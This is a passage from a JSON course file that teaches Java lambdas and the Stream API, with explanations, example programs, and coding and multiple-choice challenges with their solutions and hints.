              "content": "COLLECTING TO DIFFERENT TYPES:\n\n// To List\nList<String> list = stream.collect(Collectors.toList());\n\n// To Set (removes duplicates)\nSet<String> set = stream.collect(Collectors.toSet());\n\n// To Map\nMap<String, Integer> map = names.stream()\n    .collect(Collectors.toMap(\n        name -> name,        // Key mapper\n        String::length       // Value mapper\n    ));\n\n// Joining strings\nString joined = names.stream()\n    .collect(Collectors.joining(\", \")); // \"Alice, Bob, Charlie\"\n\n// Grouping\nMap<Integer, List<String>> byLength = names.stream()\n    .collect(Collectors.groupingBy(String::length));\n\nOTHER TERMINAL OPERATIONS:\n\n// Count\nlong count = stream.count();\n\n// Sum, average, max, min (for numbers)\nint sum = numbers.stream().mapToInt(Integer::intValue).sum();\nOptionalDouble avg = numbers.stream().mapToInt(Integer::intValue).average();\n\n// Reduce to single value\nOptional<String> concat = names.stream()\n    .reduce((a, b) -> a + b);\n\n// Any/All/None match\nboolean anyLong = names.stream().anyMatch(s -> s.length() > 10);\nboolean allShort = names.stream().allMatch(s -> s.length() < 20);"
            },
            {
              "type": "EXAMPLE",
              "title": "Stream Pipeline Examples",
              "content": "Stream pipelines chain filter, map, and collect operations for declarative collection processing. Operations are lazy until a terminal operation like collect() triggers processing.",
              "code": "import java.util.*;\nimport java.util.stream.*;\n\npublic class StreamDemo {\n    public static void main(String[] args) {\n        List<String> names = List.of(\"Alice\", \"Bob\", \"Charlie\", \"Dan\", \"Eve\");\n        \n        // Filter and collect\n        List<String> longNames = names.stream()\n            .filter(n -> n.length() > 3)\n            .collect(Collectors.toList());\n        System.out.println(longNames); // [Alice, Charlie]\n        \n        // Map and collect\n        List<Integer> lengths = names.stream()\n            .map(String::length)\n            .collect(Collectors.toList());\n        System.out.println(lengths); // [5, 3, 7, 3, 3]\n        \n        // Filter, map, collect\n        List<String> upperLong = names.stream()\n            .filter(n -> n.length() > 3)\n            .map(String::toUpperCase)\n            .collect(Collectors.toList());\n        System.out.println(upperLong); // [ALICE, CHARLIE]\n        \n        // Find first matching\n        Optional<String> firstLong = names.stream()\n            .filter(n -> n.length() > 3)\n            .findFirst();\n        firstLong.ifPresent(System.out::println); // Alice\n        \n        // Count\n        long count = names.stream()\n            .filter(n -> n.length() == 3)\n            .count();\n        System.out.println(\"3-letter names: \" + count); // 3\n        \n        // Sum with mapToInt\n        List<Integer> numbers = List.of(1, 2, 3, 4, 5);\n        int sum = numbers.stream()\n            .mapToInt(Integer::intValue)\n            .sum();\n        System.out.println(\"Sum: \" + sum); // 15\n        \n        // Join strings\n        String joined = names.stream()\n            .collect(Collectors.joining(\", \"));\n        System.out.println(joined); // Alice, Bob, Charlie, Dan, Eve\n        \n        // Group by length\n        Map<Integer, List<String>> byLength = names.stream()\n            .collect(Collectors.groupingBy(String::length));\n        System.out.println(byLength); // {3=[Bob, Dan, Eve], 5=[Alice], 7=[Charlie]}\n    }\n}",
              "language": "java"
            },
            {
              "type": "THEORY",
              "title": "Best Practices for Streams",
              "content": "DO:\n- Use streams for transforming collections\n- Chain operations for readability\n- Use method references when possible\n- Use parallel streams for CPU-intensive operations on large data\n\nDON'T:\n- Use streams for simple loops (overkill)\n- Modify external state in stream operations\n- Reuse streams (they can only be consumed once)\n- Use parallel streams for I/O operations\n\nPARALLEL STREAMS:\nList<String> result = names.parallelStream()\n    .filter(n -> n.length() > 3)\n    .map(String::toUpperCase)\n    .collect(Collectors.toList());\n\nNote: Parallel streams split work across CPU cores.\nOnly use for CPU-bound operations on large datasets!\n\nWHEN TO USE STREAMS:\n- Filtering, mapping, reducing collections\n- When you want declarative, readable code\n- When operations can be parallelized\n\nWHEN NOT TO USE:\n- Simple iteration with side effects\n- When performance is critical and data is small\n- When you need to modify the original collection"
            },
            {
              "type": "WARNING",
              "title": "Stream API Pitfalls",
              "content": "Streams can only be consumed ONCE:\nStream<String> stream = names.stream();\nstream.count();  // OK\nstream.forEach(System.out::println);  // IllegalStateException!\n\nLazy evaluation surprises:\nnames.stream().peek(System.out::println);  // Prints NOTHING!\nPeek only runs when terminal operation is called.\n\nCollectors.toList() vs Stream.toList() (Java 16+):\n.collect(Collectors.toList())  // Mutable list\n.toList()  // IMMUTABLE list - cannot modify!\n\nParallel stream ordering:\nParallel streams may not preserve order. Use forEachOrdered() if order matters.\n\nJava 22+ Stream Gatherers (Preview):\nNew gather() operation for custom intermediate operations.\nBuilt-in gatherers: Gatherers.fold(), windowFixed(), scan()."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-7-stream-filter",
              "title": "Filter with Streams",
              "description": "Given a list of numbers [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], use streams to:\n1. Filter only even numbers\n2. Collect to a list\n3. Print the first element\n\nExpected output: 2",
              "instructions": "Given a list of numbers [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], use streams to:\n1. Filter only even numbers\n2. Collect to a list\n3. Print the first element",
              "starterCode": "import module java.base;\n\nvoid main() {\n    var numbers = List.of(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);\n    // Use stream to filter and collect\n}",
              "solution": "import module java.base;\n\nvoid main() {\n    var numbers = List.of(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);\n    var evens = numbers.stream()\n        .filter(n -> n % 2 == 0)\n        .toList();\n    println(evens.get(0));\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-7-stream-filter-test-1",
                  "description": "Should print '2'",
                  "expectedOutput": "2",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use .filter(n -> n % 2 == 0) to keep even numbers"
                },
                {
                  "level": 2,
                  "text": "End with .collect(Collectors.toList()) to get a List"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting to import Collectors",
                  "consequence": "Cannot find symbol error",
                  "correction": "Add import java.util.stream.Collectors"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-7-stream-map",
              "title": "Map with Streams",
              "description": "Given a list of names [\"alice\", \"bob\", \"charlie\"], use streams to:\n1. Convert each name to uppercase\n2. Collect to a list\n3. Print the result\n\nExpected output: [ALICE, BOB, CHARLIE]",
              "instructions": "Given a list of names [\"alice\", \"bob\", \"charlie\"], use streams to:\n1. Convert each name to uppercase\n2. Collect to a list\n3. Print the result",
              "starterCode": "import module java.base;\n\nvoid main() {\n    var names = List.of(\"alice\", \"bob\", \"charlie\");\n    // Use stream to map and collect\n}",
              "solution": "import module java.base;\n\nvoid main() {\n    var names = List.of(\"alice\", \"bob\", \"charlie\");\n    var upper = names.stream()\n        .map(String::toUpperCase)\n        .toList();\n    println(upper);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-7-stream-map-test-1",
                  "description": "Should print '[ALICE, BOB, CHARLIE]'",
                  "expectedOutput": "[ALICE, BOB, CHARLIE]",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use .map() to transform each element"
                },
                {
                  "level": 2,
                  "text": "String::toUpperCase is a method reference for s -> s.toUpperCase()"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using map(String.toUpperCase())",
                  "consequence": "Compilation error",
                  "correction": "Use method reference String::toUpperCase or lambda s -> s.toUpperCase()"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-7-stream-sum",
              "title": "Sum with Streams",
              "description": "Given a list of numbers [1, 2, 3, 4, 5], use streams to calculate and print the sum.\n\nExpected output: 15",
              "instructions": "Given a list of numbers [1, 2, 3, 4, 5], use streams to calculate and print the sum.",
              "starterCode": "import module java.base;\n\nvoid main() {\n    var numbers = List.of(1, 2, 3, 4, 5);\n    // Use stream to calculate sum\n}",
              "solution": "import module java.base;\n\nvoid main() {\n    var numbers = List.of(1, 2, 3, 4, 5);\n    var sum = numbers.stream()\n        .mapToInt(Integer::intValue)\n        .sum();\n    println(sum);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-7-stream-sum-test-1",
                  "description": "Should print '15'",
                  "expectedOutput": "15",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use .mapToInt() to convert to IntStream which has a .sum() method"
                },
                {
                  "level": 2,
                  "text": "Integer::intValue extracts the int value from Integer objects"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Trying to call .sum() on a regular Stream",
                  "consequence": "Method not found error",
                  "correction": "Convert to IntStream first with mapToInt()"
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-7-stream-chain",
              "title": "Chaining Stream Operations",
              "description": "Given a list of numbers [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], use streams to:\n1. Filter only numbers greater than 5\n2. Multiply each by 2\n3. Collect to a list\n4. Print the result\n\nExpected output: [12, 14, 16, 18, 20]",
              "instructions": "Given a list of numbers [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], use streams to:\n1. Filter only numbers greater than 5\n2. Multiply each by 2\n3. Collect to a list\n4. Print the result",
              "starterCode": "import module java.base;\n\nvoid main() {\n    var numbers = List.of(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);\n    // Chain filter, map, and collect\n}",
              "solution": "import module java.base;\n\nvoid main() {\n    var numbers = List.of(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);\n    var result = numbers.stream()\n        .filter(n -> n > 5)\n        .map(n -> n * 2)\n        .toList();\n    println(result);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-7-stream-chain-test-1",
                  "description": "Should print '[12, 14, 16, 18, 20]'",
                  "expectedOutput": "[12, 14, 16, 18, 20]",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Chain operations: .filter().map().collect()"
                },
                {
                  "level": 2,
                  "text": "Filter comes before map to avoid transforming elements we don't need"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Putting map before filter",
                  "consequence": "Works but less efficient",
                  "correction": "Filter first to reduce the number of elements to transform"
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ],
      "order": 5
    },
    {
      "id": "module-streams",
      "title": "Streams & Functional Programming",
      "description": "Master lambdas, streams, and functional programming patterns in Java.",
      "difficulty": "intermediate",
      "estimatedHours": 3.25,
      "lessons": [
        {
          "id": "streams-lesson-1",
          "title": "Lesson S.1: Lambdas & Functional Interfaces",
          "moduleId": "module-streams",
          "order": 1,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Verbose Anonymous Classes",
              "content": "Before Java 8, passing behavior as a parameter required anonymous inner classes:\n\n// Old way: 5 lines just to compare two strings!\nCollections.sort(names, new Comparator<String>() {\n    @Override\n    public int compare(String a, String b) {\n        return a.compareTo(b);\n    }\n});\n\nThis is verbose, hard to read, and obscures the actual logic (just one line: a.compareTo(b)).\n\nLambdas solve this by allowing you to express behavior concisely:\n\n// New way: 1 line!\nCollections.sort(names, (a, b) -> a.compareTo(b));\n\nLambdas are anonymous functions - code blocks you can pass around like data."
            },
            {
              "type": "KEY_POINT",
              "title": "Lambda Syntax",
              "content": "Lambda expressions have this basic syntax:\n\n(parameters) -> expression\n// or\n(parameters) -> { statements; }\n\nExamples:\n\n// No parameters\n() -> System.out.println(\"Hello\")\n\n// One parameter (parentheses optional)\nx -> x * 2\n(x) -> x * 2\n\n// Two parameters\n(x, y) -> x + y\n\n// Multiple statements (need braces and return)\n(x, y) -> {\n    int sum = x + y;\n    return sum * 2;\n}\n\n// With explicit types\n(String s) -> s.length()\n\nThe arrow (->) separates parameters from the body. Think of it as 'goes to' or 'becomes'."
            },
            {
              "type": "THEORY",
              "title": "Functional Interfaces",
              "content": "A lambda can only be used where Java expects a FUNCTIONAL INTERFACE - an interface with exactly one abstract method.\n\nJava provides many built-in functional interfaces in java.util.function:\n\nPredicate<T>: Takes T, returns boolean\n  Predicate<String> isEmpty = s -> s.isEmpty();\n  isEmpty.test(\"\");  // true\n\nFunction<T, R>: Takes T, returns R\n  Function<String, Integer> length = s -> s.length();\n  length.apply(\"hello\");  // 5\n\nConsumer<T>: Takes T, returns nothing\n  Consumer<String> printer = s -> System.out.println(s);\n  printer.accept(\"hello\");  // prints: hello\n\nSupplier<T>: Takes nothing, returns T\n  Supplier<Double> random = () -> Math.random();\n  random.get();  // 0.7234...\n\nThese are the building blocks of functional programming in Java."
            },
            {
              "type": "EXAMPLE",
              "title": "Practical Lambda Examples",
              "content": "Here are real-world uses of lambdas with functional interfaces:",
              "code": "import java.util.function.*;\nimport java.util.*;\n\nvoid main() {\n    // Predicate: filtering\n    Predicate<Integer> isEven = n -> n % 2 == 0;\n    System.out.println(isEven.test(4));  // true\n    System.out.println(isEven.test(7));  // false\n    \n    // Function: transforming\n    Function<String, String> toUpper = s -> s.toUpperCase();\n    System.out.println(toUpper.apply(\"hello\"));  // HELLO\n    \n    // Consumer: performing actions\n    List<String> names = List.of(\"Alice\", \"Bob\", \"Charlie\");\n    names.forEach(name -> System.out.println(\"Hi, \" + name));\n    \n    // Supplier: generating values\n    Supplier<UUID> idGenerator = () -> UUID.randomUUID();\n    System.out.println(idGenerator.get());\n    \n    // Combining predicates\n    Predicate<Integer> isPositive = n -> n > 0;\n    Predicate<Integer> isEvenAndPositive = isEven.and(isPositive);\n    System.out.println(isEvenAndPositive.test(4));   // true\n    System.out.println(isEvenAndPositive.test(-4));  // false\n}",
              "language": "java"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-1-mc-1",
              "title": "Lambda Syntax",
              "description": "Understanding lambda expression syntax",
              "question": "Which of the following is a valid lambda expression that takes two integers and returns their sum?",
              "options": [
                "(int x, int y) => x + y",
                "(x, y) -> x + y",
                "x, y -> x + y",
                "(x, y) => { return x + y; }"
              ],
              "correctAnswer": 1,
              "explanation": "Java lambdas use -> (arrow), not =>. Parameters must be in parentheses when there are multiple. The expression form (x, y) -> x + y is the correct, concise syntax for returning the sum of two parameters.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-1-mc-2",
              "title": "Functional Interfaces",
              "description": "Understanding which functional interface to use",
              "question": "You need a function that takes a String and returns a boolean indicating if it's valid. Which functional interface should you use?",
              "options": [
                "Function<String, Boolean>",
                "Predicate<String>",
                "Consumer<String>",
                "Supplier<Boolean>"
              ],
              "correctAnswer": 1,
              "explanation": "Predicate<T> is designed specifically for testing conditions - it takes an argument of type T and returns a boolean. While Function<String, Boolean> would work, Predicate<String> is more idiomatic and provides additional methods like and(), or(), and negate().",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "streams-lesson-2",
          "title": "Lesson S.2: Stream Basics",
          "moduleId": "module-streams",
          "order": 2,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "What Are Streams?",
              "content": "A Stream is a sequence of elements that supports functional-style operations. Unlike collections, streams:\n\n1. DON'T STORE DATA - they process elements from a source\n2. ARE LAZY - operations execute only when needed\n3. CAN BE INFINITE - generate elements on demand\n4. ARE CONSUMED ONCE - you cannot reuse a stream after a terminal operation\n\nThink of streams as a pipeline: data flows through, gets transformed, and produces a result.\n\n// Collection: data at rest\nList<String> names = List.of(\"Alice\", \"Bob\", \"Charlie\");\n\n// Stream: data in motion\nnames.stream()\n     .filter(name -> name.startsWith(\"A\"))\n     .map(String::toUpperCase)\n     .forEach(System.out::println);  // ALICE\n\nStreams enable declarative programming - you say WHAT you want, not HOW to do it."
            },
            {
              "type": "KEY_POINT",
              "title": "Creating Streams",
              "content": "There are multiple ways to create streams:\n\nFrom Collections:\n  List<String> list = List.of(\"a\", \"b\", \"c\");\n  Stream<String> stream = list.stream();\n\nFrom Arrays:\n  String[] arr = {\"a\", \"b\", \"c\"};\n  Stream<String> stream = Arrays.stream(arr);\n\nUsing Stream.of():\n  Stream<String> stream = Stream.of(\"a\", \"b\", \"c\");\n\nUsing Stream.generate() (infinite):\n  Stream<Double> randoms = Stream.generate(Math::random);\n\nUsing Stream.iterate() (infinite):\n  Stream<Integer> evens = Stream.iterate(0, n -> n + 2);\n\nFrom files:\n  Stream<String> lines = Files.lines(Path.of(\"file.txt\"));\n\nPrimitive streams (avoid boxing overhead):\n  IntStream ints = IntStream.range(1, 100);  // 1 to 99\n  IntStream inclusive = IntStream.rangeClosed(1, 100);  // 1 to 100"
            },
            {
              "type": "THEORY",
              "title": "Core Stream Operations",
              "content": "Stream operations are either INTERMEDIATE (return a stream) or TERMINAL (produce a result).\n\nINTERMEDIATE OPERATIONS (lazy, chainable):\n\nfilter(Predicate): Keep elements matching condition\n  .filter(n -> n > 0)\n\nmap(Function): Transform each element\n  .map(String::toUpperCase)\n\nsorted(): Sort elements\n  .sorted()  // natural order\n  .sorted(Comparator.reverseOrder())\n\ndistinct(): Remove duplicates\n  .distinct()\n\nlimit(n): Take first n elements\n  .limit(5)\n\nskip(n): Skip first n elements\n  .skip(10)\n\nTERMINAL OPERATIONS (trigger execution):\n\nforEach(Consumer): Process each element\n  .forEach(System.out::println)\n\ncount(): Count elements\n  long count = stream.count();\n\ncollect(): Gather results into collection\n  List<String> list = stream.collect(Collectors.toList());\n\nfindFirst(), findAny(): Get an element\n  Optional<String> first = stream.findFirst();"
            },
            {
              "type": "EXAMPLE",
              "title": "Building Stream Pipelines",
              "content": "Let's see how to chain operations effectively:",
              "code": "import java.util.*;\nimport java.util.stream.*;\n\nvoid main() {\n    List<String> names = List.of(\n        \"Alice\", \"Bob\", \"Charlie\", \"David\", \"Eve\", \"Alice\"\n    );\n    \n    // Filter, transform, collect\n    List<String> result = names.stream()\n        .filter(name -> name.length() > 3)      // Alice, Charlie, David, Alice\n        .map(String::toUpperCase)                // ALICE, CHARLIE, DAVID, ALICE\n        .distinct()                              // ALICE, CHARLIE, DAVID\n        .sorted()                                // ALICE, CHARLIE, DAVID\n        .collect(Collectors.toList());\n    \n    System.out.println(result);  // [ALICE, CHARLIE, DAVID]\n    \n    // Count elements matching a condition\n    long count = names.stream()\n        .filter(name -> name.startsWith(\"A\"))\n        .count();\n    System.out.println(\"Names starting with A: \" + count);  // 2\n    \n    // Find first match\n    Optional<String> first = names.stream()\n        .filter(name -> name.contains(\"v\"))\n        .findFirst();\n    first.ifPresent(name -> System.out.println(\"Found: \" + name));  // David\n    \n    // Numeric operations with IntStream\n    int sum = IntStream.rangeClosed(1, 10).sum();\n    System.out.println(\"Sum 1-10: \" + sum);  // 55\n}",
              "language": "java"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-2-mc-1",
              "title": "Stream Characteristics",
              "description": "Understanding how streams work",
              "question": "What happens when you call filter() on a stream?",
              "options": [
                "It immediately filters the elements and returns a new list",
                "It stores the filter condition and returns a new stream, executing only when a terminal operation is called",
                "It modifies the original collection in place",
                "It throws an exception if no elements match"
              ],
              "correctAnswer": 1,
              "explanation": "Stream operations are lazy - intermediate operations like filter() don't execute immediately. They build up a pipeline that only executes when a terminal operation (like collect(), count(), or forEach()) is called. This allows for optimizations like short-circuiting.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-2-mc-2",
              "title": "Creating Streams",
              "description": "Knowing how to create streams from different sources",
              "question": "Which of the following is NOT a valid way to create a stream?",
              "options": [
                "List.of(1, 2, 3).stream()",
                "Stream.of(\"a\", \"b\", \"c\")",
                "Arrays.stream(new int[]{1, 2, 3})",
                "new Stream<>(1, 2, 3)"
              ],
              "correctAnswer": 3,
              "explanation": "Stream is an interface, not a class, so you cannot instantiate it with 'new'. Use factory methods like stream() on collections, Stream.of() for values, or Arrays.stream() for arrays.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "streams-lesson-3",
          "title": "Lesson S.3: Collecting Results",
          "moduleId": "module-streams",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The collect() Terminal Operation",
              "content": "After processing elements through a stream pipeline, you often need to gather results into a collection. The collect() method is the primary way to do this.\n\nBasic usage with Collectors:\n\n// Collect to List\nList<String> list = stream.collect(Collectors.toList());\n\n// Java 16+: Simpler syntax\nList<String> list = stream.toList();  // Returns unmodifiable list\n\n// Collect to Set (removes duplicates)\nSet<String> set = stream.collect(Collectors.toSet());\n\n// Collect to specific collection type\nTreeSet<String> treeSet = stream.collect(\n    Collectors.toCollection(TreeSet::new)\n);\n\nThe Collectors utility class provides many powerful collectors for different use cases."
            },
            {
              "type": "KEY_POINT",
              "title": "Common Collectors",
              "content": "The Collectors class provides pre-built collectors for common operations:\n\ntoList(), toSet(), toCollection()\n  Gather elements into a collection\n\ntoMap(keyMapper, valueMapper)\n  Create a map from stream elements\n  Map<Integer, String> map = people.stream()\n      .collect(Collectors.toMap(Person::getId, Person::getName));\n\njoining(), joining(delimiter)\n  Concatenate strings\n  String csv = names.stream().collect(Collectors.joining(\", \"));\n  // \"Alice, Bob, Charlie\"\n\ncounting()\n  Count elements (like count() but as a collector)\n\nsummarizingInt/Long/Double(mapper)\n  Get statistics (count, sum, min, max, average)\n\naverageInt/Long/Double(mapper)\n  Calculate average\n\nmaxBy(comparator), minBy(comparator)\n  Find max/min element"
            },
            {
              "type": "THEORY",
              "title": "Creating Maps with toMap()",
              "content": "Converting a stream to a Map is common but has pitfalls:\n\nBasic toMap:\n  Map<Integer, String> idToName = people.stream()\n      .collect(Collectors.toMap(\n          Person::getId,      // key mapper\n          Person::getName     // value mapper\n      ));\n\nHandling duplicate keys (throws exception by default!):\n  Map<String, Integer> wordCounts = words.stream()\n      .collect(Collectors.toMap(\n          word -> word,           // key: the word itself\n          word -> 1,              // value: count of 1\n          (existing, newVal) -> existing + newVal  // merge: add counts\n      ));\n\nSpecifying map type:\n  LinkedHashMap<Integer, String> ordered = people.stream()\n      .collect(Collectors.toMap(\n          Person::getId,\n          Person::getName,\n          (a, b) -> a,            // keep first on collision\n          LinkedHashMap::new      // use LinkedHashMap\n      ));\n\nWARNING: toMap() with duplicate keys throws IllegalStateException unless you provide a merge function!"
            },
            {
              "type": "EXAMPLE",
              "title": "Collecting in Practice",
              "content": "Real-world examples of collecting stream results:",
              "code": "import java.util.*;\nimport java.util.stream.*;\n\nrecord Person(int id, String name, int age, String department) {}\n\nvoid main() {\n    List<Person> people = List.of(\n        new Person(1, \"Alice\", 30, \"Engineering\"),\n        new Person(2, \"Bob\", 25, \"Marketing\"),\n        new Person(3, \"Charlie\", 35, \"Engineering\"),\n        new Person(4, \"Diana\", 28, \"Marketing\")\n    );\n    \n    // Collect names to a list\n    List<String> names = people.stream()\n        .map(Person::name)\n        .toList();\n    System.out.println(names);  // [Alice, Bob, Charlie, Diana]\n    \n    // Create ID -> Person map\n    Map<Integer, Person> byId = people.stream()\n        .collect(Collectors.toMap(Person::id, p -> p));\n    System.out.println(byId.get(2).name());  // Bob\n    \n    // Join names with comma\n    String joined = people.stream()\n        .map(Person::name)\n        .collect(Collectors.joining(\", \"));\n    System.out.println(joined);  // Alice, Bob, Charlie, Diana\n    \n    // Get age statistics\n    IntSummaryStatistics stats = people.stream()\n        .collect(Collectors.summarizingInt(Person::age));\n    System.out.println(\"Avg age: \" + stats.getAverage());  // 29.5\n    System.out.println(\"Max age: \" + stats.getMax());      // 35\n    \n    // Collect to TreeSet (sorted)\n    TreeSet<String> sortedNames = people.stream()\n        .map(Person::name)\n        .collect(Collectors.toCollection(TreeSet::new));\n    System.out.println(sortedNames);  // [Alice, Bob, Charlie, Diana]\n}",
              "language": "java"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-3-mc-1",
              "title": "toList() Behavior",
              "description": "Understanding the difference between collect(toList()) and toList()",
              "question": "What is the key difference between stream.collect(Collectors.toList()) and stream.toList() in Java 16+?",
              "options": [
                "There is no difference, they are identical",
                "toList() returns an unmodifiable list, collect(toList()) returns a modifiable ArrayList",
                "collect(toList()) is faster",
                "toList() only works with String streams"
              ],
              "correctAnswer": 1,
              "explanation": "The stream.toList() method introduced in Java 16 returns an unmodifiable list (you cannot add/remove elements). In contrast, Collectors.toList() returns a modifiable ArrayList. Choose based on whether you need to modify the result.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-3-mc-2",
              "title": "toMap() Duplicate Keys",
              "description": "Understanding toMap() behavior with duplicates",
              "question": "What happens when you use Collectors.toMap() and the stream contains elements that map to the same key?",
              "options": [
                "The last value wins and overwrites previous values",
                "The first value wins and later values are ignored",
                "An IllegalStateException is thrown",
                "Both values are stored in a list"
              ],
              "correctAnswer": 2,
              "explanation": "By default, Collectors.toMap() throws an IllegalStateException when it encounters duplicate keys. To handle duplicates, you must provide a merge function as the third argument, like (existing, newVal) -> existing to keep the first value.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "streams-lesson-4",
          "title": "Lesson S.4: Advanced Streams",
          "moduleId": "module-streams",
          "order": 4,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "flatMap: Flattening Nested Structures",
              "content": "When you have nested collections or need to expand elements, flatMap() is your tool. It maps each element to a stream, then flattens all streams into one.\n\nmap() vs flatMap():\n\n// map: one-to-one transformation\nList<String> words = List.of(\"hello\", \"world\");\nwords.stream().map(String::toUpperCase);  // Stream of \"HELLO\", \"WORLD\"\n\n// flatMap: one-to-many, then flatten\nList<List<Integer>> nested = List.of(\n    List.of(1, 2),\n    List.of(3, 4, 5)\n);\nnested.stream()\n    .flatMap(List::stream)  // Flatten to: 1, 2, 3, 4, 5\n    .forEach(System.out::println);\n\n// Common use: split words into characters\n\"hello world\".chars()  // IntStream of character codes\n\nList.of(\"hello\", \"world\").stream()\n    .flatMap(word -> word.chars().mapToObj(c -> (char) c))\n    .forEach(System.out::print);  // helloworld"
            },
            {
              "type": "KEY_POINT",
              "title": "reduce: Aggregating Values",
              "content": "The reduce() operation combines all elements into a single result using an accumulator function.\n\nThree forms of reduce:\n\n1. With identity and accumulator:\n   int sum = numbers.stream().reduce(0, (a, b) -> a + b);\n   // Equivalent to: Integer.sum as method reference\n   int sum = numbers.stream().reduce(0, Integer::sum);\n\n2. Without identity (returns Optional):\n   Optional<Integer> max = numbers.stream()\n       .reduce((a, b) -> a > b ? a : b);\n\n3. With identity, accumulator, and combiner (for parallel):\n   int result = numbers.parallelStream()\n       .reduce(0, Integer::sum, Integer::sum);\n\nExamples:\n  // Product of all numbers\n  int product = List.of(1, 2, 3, 4).stream()\n      .reduce(1, (a, b) -> a * b);  // 24\n  \n  // Concatenate strings\n  String concat = List.of(\"a\", \"b\", \"c\").stream()\n      .reduce(\"\", (a, b) -> a + b);  // \"abc\"\n  // But prefer Collectors.joining() for strings!"
            },
            {
              "type": "THEORY",
              "title": "Grouping and Partitioning",
              "content": "Collectors provides powerful grouping operations:\n\ngroupingBy(classifier): Group elements by a key\n  Map<String, List<Person>> byDept = people.stream()\n      .collect(Collectors.groupingBy(Person::department));\n  // {Engineering=[Alice, Charlie], Marketing=[Bob, Diana]}\n\ngroupingBy with downstream collector:\n  Map<String, Long> countByDept = people.stream()\n      .collect(Collectors.groupingBy(\n          Person::department,\n          Collectors.counting()\n      ));\n  // {Engineering=2, Marketing=2}\n\n  Map<String, Double> avgAgeByDept = people.stream()\n      .collect(Collectors.groupingBy(\n          Person::department,\n          Collectors.averagingInt(Person::age)\n      ));\n\npartitioningBy(predicate): Split into true/false groups\n  Map<Boolean, List<Person>> seniorVsJunior = people.stream()\n      .collect(Collectors.partitioningBy(p -> p.age() >= 30));\n  // {true=[Alice, Charlie], false=[Bob, Diana]}\n\nPartitioning always returns exactly two groups (true and false), even if empty."
            },
            {
              "type": "EXAMPLE",
              "title": "Advanced Stream Operations",
              "content": "Combining advanced operations for complex data processing:",
              "code": "import java.util.*;\nimport java.util.stream.*;\n\nrecord Order(int id, String customer, List<String> items, double total) {}\n\nvoid main() {\n    List<Order> orders = List.of(\n        new Order(1, \"Alice\", List.of(\"Book\", \"Pen\"), 25.0),\n        new Order(2, \"Bob\", List.of(\"Laptop\"), 999.0),\n        new Order(3, \"Alice\", List.of(\"Coffee\", \"Tea\", \"Sugar\"), 15.0),\n        new Order(4, \"Charlie\", List.of(\"Phone\", \"Case\"), 850.0)\n    );\n    \n    // flatMap: Get all unique items across all orders\n    Set<String> allItems = orders.stream()\n        .flatMap(order -> order.items().stream())\n        .collect(Collectors.toSet());\n    System.out.println(\"All items: \" + allItems);\n    \n    // reduce: Calculate total revenue\n    double totalRevenue = orders.stream()\n        .map(Order::total)\n        .reduce(0.0, Double::sum);\n    System.out.println(\"Total revenue: $\" + totalRevenue);  // $1889.0\n    \n    // groupingBy: Orders by customer\n    Map<String, List<Order>> byCustomer = orders.stream()\n        .collect(Collectors.groupingBy(Order::customer));\n    System.out.println(\"Alice's orders: \" + byCustomer.get(\"Alice\").size());  // 2\n    \n    // groupingBy with sum: Total spent per customer\n    Map<String, Double> spentByCustomer = orders.stream()\n        .collect(Collectors.groupingBy(\n            Order::customer,\n            Collectors.summingDouble(Order::total)\n        ));\n    System.out.println(\"Alice spent: $\" + spentByCustomer.get(\"Alice\"));  // $40.0\n    \n    // partitioningBy: High-value vs regular orders\n    Map<Boolean, List<Order>> partitioned = orders.stream()\n        .collect(Collectors.partitioningBy(o -> o.total() > 100));\n    System.out.println(\"High-value orders: \" + partitioned.get(true).size());  // 2\n}",
              "language": "java"
            }
          ],
          "challenges": [
            {
